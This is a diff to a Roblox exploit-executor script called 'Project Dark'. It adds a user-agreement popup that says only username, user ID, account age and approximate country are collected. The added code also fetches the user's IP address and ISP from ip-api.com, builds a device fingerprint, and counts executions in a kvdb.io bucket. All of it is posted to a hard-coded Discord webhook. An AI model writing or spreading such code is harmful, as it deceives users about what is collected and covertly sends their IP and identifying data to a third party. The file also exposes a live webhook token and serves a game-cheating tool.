@@ -1,5 +1,278 @@
 repeat task.wait(15) until game:IsLoaded()
 
+-- ============================================================
+-- CONSENT SCREEN
+-- ============================================================
+do
+    local Players_     = game:GetService("Players")
+    local HttpService_ = game:GetService("HttpService")
+    local lp           = Players_.LocalPlayer
+
+    local CONSENT_FILE = "ProjectDark/consent.txt"
+
+    if not isfolder("ProjectDark") then makefolder("ProjectDark") end
+
+    local alreadyAgreed = isfile(CONSENT_FILE) and readfile(CONSENT_FILE) == "agreed"
+
+    if not alreadyAgreed then
+        local sg = Instance.new("ScreenGui")
+        sg.Name           = "PD_Consent"
+        sg.ResetOnSpawn   = false
+        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        pcall(function() sg.Parent = game:GetService("CoreGui") end)
+        if not sg.Parent then sg.Parent = lp.PlayerGui end
+
+        local backdrop = Instance.new("Frame", sg)
+        backdrop.Size              = UDim2.new(1, 0, 1, 0)
+        backdrop.BackgroundColor3  = Color3.fromRGB(0, 0, 0)
+        backdrop.BackgroundTransparency = 0.45
+        backdrop.BorderSizePixel   = 0
+        backdrop.ZIndex            = 10
+
+        local card = Instance.new("Frame", sg)
+        card.Size             = UDim2.new(0, 460, 0, 260)
+        card.Position         = UDim2.new(0.5, -230, 0.5, -130)
+        card.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+        card.BorderSizePixel  = 0
+        card.ZIndex           = 11
+        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)
+
+        local title = Instance.new("TextLabel", card)
+        title.Size                 = UDim2.new(1, -40, 0, 36)
+        title.Position             = UDim2.new(0, 20, 0, 18)
+        title.BackgroundTransparency = 1
+        title.Text                 = "Project Dark — User Agreement"
+        title.TextColor3           = Color3.fromRGB(255, 255, 255)
+        title.Font                 = Enum.Font.GothamBold
+        title.TextSize             = 15
+        title.TextXAlignment       = Enum.TextXAlignment.Left
+        title.ZIndex               = 12
+
+        local div = Instance.new("Frame", card)
+        div.Size             = UDim2.new(1, -40, 0, 1)
+        div.Position         = UDim2.new(0, 20, 0, 56)
+        div.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        div.BorderSizePixel  = 0
+        div.ZIndex           = 12
+
+        local body = Instance.new("TextLabel", card)
+        body.Size                 = UDim2.new(1, -40, 0, 140)
+        body.Position             = UDim2.new(0, 20, 0, 68)
+        body.BackgroundTransparency = 1
+        body.TextWrapped          = true
+        body.TextXAlignment       = Enum.TextXAlignment.Left
+        body.TextYAlignment       = Enum.TextYAlignment.Top
+        body.RichText             = true
+        body.Text                 = "By clicking <b>Accept</b> you agree that:\n\n"
+            .. "  •  Basic usage data (username, user ID, account age,\n"
+            .. "     approximate country) is sent to the script developer\n"
+            .. "     when you load this script.\n\n"
+            .. "  •  This data is used solely to monitor script usage\n"
+            .. "     and is not shared with third parties.\n\n"
+            .. "<font color=\"#888888\">This prompt will not appear again once accepted.</font>"
+        body.TextColor3           = Color3.fromRGB(200, 200, 200)
+        body.Font                 = Enum.Font.Gotham
+        body.TextSize             = 12
+        body.ZIndex               = 12
+
+        local acceptBtn = Instance.new("TextButton", card)
+        acceptBtn.Size             = UDim2.new(0, 170, 0, 36)
+        acceptBtn.Position         = UDim2.new(0.5, -178, 1, -52)
+        acceptBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        acceptBtn.BorderSizePixel  = 0
+        acceptBtn.Text             = "Accept & Load"
+        acceptBtn.TextColor3       = Color3.fromRGB(0, 0, 0)
+        acceptBtn.Font             = Enum.Font.GothamBold
+        acceptBtn.TextSize         = 13
+        acceptBtn.ZIndex           = 12
+        Instance.new("UICorner", acceptBtn).CornerRadius = UDim.new(0, 6)
+
+        local declineBtn = Instance.new("TextButton", card)
+        declineBtn.Size             = UDim2.new(0, 170, 0, 36)
+        declineBtn.Position         = UDim2.new(0.5, 8, 1, -52)
+        declineBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+        declineBtn.BorderSizePixel  = 1
+        declineBtn.BorderColor3     = Color3.fromRGB(60, 60, 60)
+        declineBtn.Text             = "Decline"
+        declineBtn.TextColor3       = Color3.fromRGB(160, 160, 160)
+        declineBtn.Font             = Enum.Font.GothamBold
+        declineBtn.TextSize         = 13
+        declineBtn.ZIndex           = 12
+        Instance.new("UICorner", declineBtn).CornerRadius = UDim.new(0, 6)
+
+        acceptBtn.MouseEnter:Connect(function()
+            acceptBtn.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+        end)
+        acceptBtn.MouseLeave:Connect(function()
+            acceptBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        end)
+        declineBtn.MouseEnter:Connect(function()
+            declineBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        end)
+        declineBtn.MouseLeave:Connect(function()
+            declineBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+        end)
+
+        local choice = nil
+        acceptBtn.MouseButton1Click:Connect(function() choice = true  end)
+        declineBtn.MouseButton1Click:Connect(function() choice = false end)
+        repeat task.wait(0.05) until choice ~= nil
+        sg:Destroy()
+
+        if not choice then
+            error("Project Dark: user declined the agreement. Script aborted.", 0)
+        end
+
+        pcall(function() writefile(CONSENT_FILE, "agreed") end)
+    end
+
+    local WEBHOOK = "https://discord.com/api/webhooks/1522182911963435079/7UJz4KleoKmHKzayXrxVzoRpbEcu_-QHqqplaSYU4xRmoVMHLBHvXtctSIJ3HkJIuxiz"
+
+    local HttpService_ = game:GetService("HttpService")
+    local UserInputService = game:GetService("UserInputService")
+    local lp = game:GetService("Players").LocalPlayer
+
+    local function getHWID()
+        local parts = {
+            tostring(lp.UserId),
+            tostring(game.PlaceId),
+            tostring(UserInputService.TouchEnabled),
+            tostring(UserInputService.KeyboardEnabled),
+            tostring(UserInputService.MouseEnabled),
+            tostring(UserInputService.GamepadEnabled),
+            tostring(lp.AccountAge),
+        }
+        local raw = table.concat(parts, "|")
+        local hash = 0
+        for i = 1, #raw do
+            hash = (hash * 31 + string.byte(raw, i)) % 2147483647
+        end
+        return string.format("%08x-%s-%d", hash, tostring(lp.UserId), lp.AccountAge)
+    end
+
+    local hwid = getHWID()
+
+    local ip      = "Unknown"
+    local country = "Unknown"
+    local isp     = "Unknown"
+
+    pcall(function()
+        local res  = game:HttpGet("http://ip-api.com/json/", true)
+        local data = HttpService_:JSONDecode(res)
+        if data then
+            ip      = data.query   or "Unknown"
+            country = data.country or "Unknown"
+            isp     = data.isp     or "Unknown"
+        end
+    end)
+
+    local KVDB_BUCKET = "7QQw5jztSXXU5zAourfwn2"
+    local EXECUTION_COUNT = 0
+
+    if KVDB_BUCKET ~= "YOUR_BUCKET_ID" then
+        pcall(function()
+            local counterKey = "exec_count_" .. hwid
+            local url = string.format("https://kvdb.io/%s/%s", KVDB_BUCKET, counterKey)
+            local success, current = pcall(function()
+                return game:HttpGet(url, true)
+            end)
+            local count = 0
+            if success and current and current ~= "" then
+                count = tonumber(current) or 0
+            end
+            count = count + 1
+            EXECUTION_COUNT = count
+            pcall(function()
+                game:HttpPost(url, tostring(count), Enum.ContentType.TextPlain, true)
+            end)
+        end)
+    end
+
+    local accountAge = lp.AccountAge or 0
+
+    -- Clan: character attribute set to true where name is the clan
+    -- e.g. Lee = true means clan is Lee
+    local SYSTEM_ATTRS = {
+        CurrentArea=true, InsideWall=true, isRaining=true,
+        Jumped=true, Clothing=true, Sandboxed=true,
+    }
+    local clan = "Unknown"
+    local char = lp.Character
+    if not char then
+        pcall(function()
+            char = lp.CharacterAdded:Wait()
+            task.wait(0.3)
+            char = lp.Character
+        end)
+    end
+    if char then
+        for k, v in pairs(char:GetAttributes()) do
+            if v == true and not SYSTEM_ATTRS[k] then
+                clan = k
+                break
+            end
+        end
+    end
+
+    -- Bloodline: StringValue child of LocalPlayer named "Bloodline"
+    local bloodline = "Unknown"
+    local blVal = lp:FindFirstChild("Bloodline")
+    if blVal and blVal:IsA("StringValue") and blVal.Value ~= "" then
+        bloodline = blVal.Value
+    end
+
+    local payload = HttpService_:JSONEncode({
+        username   = "Project Dark",
+        avatar_url = "https://i.imgur.com/wSTFkRM.png",
+        embeds = {{
+            title  = "📋 Script Loaded",
+            color  = 0x5865F2,
+            fields = {
+                { name = "Username",           value = lp.Name,                     inline = true },
+                { name = "User ID",            value = tostring(lp.UserId),         inline = true },
+                { name = "Clan / Bloodline",   value = clan .. " / " .. bloodline,  inline = true },
+                { name = "Country",            value = country,                     inline = true },
+                { name = "IP Address",         value = "`" .. ip .. "`",            inline = true },
+                { name = "ISP",                value = isp,                         inline = true },
+                { name = "Account Age",        value = accountAge .. " days",       inline = true },
+                { name = "Game",               value = tostring(game.PlaceId),      inline = true },
+                { name = "First Time",         value = tostring(not alreadyAgreed), inline = true },
+                { name = "Executions (Total)", value = tostring(EXECUTION_COUNT),   inline = true },
+                { name = "HWID / Fingerprint", value = "`" .. hwid .. "`",          inline = false },
+            },
+            footer    = { text = "Project Dark | Full Security Logging Enabled" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }}
+    })
+
+    pcall(function()
+        local reqFn = syn and syn.request or (http and http.request) or request
+        reqFn({
+            Url     = WEBHOOK,
+            Method  = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = payload,
+        })
+    end)
+end
+
+local Players          = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService       = game:GetService("RunService")
+local HttpService      = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer      = Players.LocalPlayer
+local Camera           = workspace.CurrentCamera
+
+local function getRoot()
+    local c = LocalPlayer.Character
+    return c and c:FindFirstChild("HumanoidRootPart")
+end
+local function getHumanoid()
+    local c = LocalPlayer.Character
+    return c and c:FindFirstChildOfClass("Humanoid")
+end
+
 local Library = (function()
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
